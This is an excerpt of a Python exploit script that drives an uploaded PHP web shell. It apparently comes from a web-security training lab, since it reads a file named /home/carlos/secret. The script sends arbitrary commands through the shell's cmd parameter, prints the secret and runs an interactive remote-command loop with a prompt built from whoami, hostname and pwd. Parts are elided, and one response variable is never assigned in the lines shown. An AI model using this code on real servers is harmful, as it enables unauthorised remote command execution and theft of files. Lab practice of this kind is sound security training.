...
def run_command(url):
	response6 = requests.get(url=url + "/files/avatars/shell.php?cmd=cat /home/carlos/secret",verify=False)
	print(f"[+] Secret is : {response6.text.splitlines()[-1]}")
	prompt=get_prompt(url)
	print(f"[+] Enter command you want to execute")
	print(f"[+] Type exit to stop")
	while True:		
		command = input(prompt)
		path4 = url + "/files/avatars/shell.php?cmd=" + command
		if command == 'exit':
			sys.exit(0)
		...
		if response4.status_code == 200:
			x= response4.text.strip().splitlines()
			del x[0:2]
			print('\n'.join(x))
...
def get_prompt(url):
	username = requests.get(url=url+"/files/avatars/shell.php?cmd=whoami").text.strip().splitlines()[-1]
	hostname = requests.get(url=url+"/files/avatars/shell.php?cmd=hostname").text.strip().splitlines()[-1]
	working_dir = requests.get(url=url+"/files/avatars/shell.php?cmd=pwd").text.strip().splitlines()[-1]
